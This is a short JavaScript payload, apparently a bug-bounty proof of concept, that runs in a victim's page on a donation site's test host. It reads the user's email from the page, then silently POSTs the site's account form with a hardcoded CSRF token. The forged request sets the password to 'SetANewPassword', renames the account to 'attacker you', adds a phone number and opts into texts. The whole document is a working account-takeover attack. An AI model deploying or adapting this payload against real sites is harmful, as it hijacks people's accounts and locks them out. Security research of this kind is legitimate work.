const inputDisplay = document.querySelector('.input-display');
const text = inputDisplay.textContent.trim();
const email = text.split('\n')[0].trim();
alert("Your email account is " + email + "will be set a new password.");


 // 查找包含csrf_token的input元素
const csrfTokenElement = window.csrfToken;
if (csrfTokenElement) {
    const formData = new URLSearchParams();
    formData.append('password', 'SetANewPassword');
    formData.append('passwordConfirm', 'SetANewPassword');
    formData.append('first', 'attacker');
    formData.append('last', 'you');
    formData.append('phone', '(760) 278-1253');
    formData.append('optedIntoTransactionalTexts', 'true');
    formData.append('_optedIntoTransactionalTexts', 'on');
    formData.append('_optedIntoMarketingTexts', 'on');
    formData.append('birthday', '');
    formData.append('birthdayMonth', '');
    formData.append('birthdayDate', '');
    formData.append('_csrf', '3fea7a40-ef6f-4775-b63e-96e25c7d6bed');
    formData.append('myaccount', 'Save changes');
            
    // 发送 POST 请求（不处理返回数据）
    fetch('https://bugbounty-secure.dctest.donorschoose.org/common/11111private-info.html', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: formData.toString()
    })
    .catch(error => {
      console.error('Request failed:', error);
    });
}

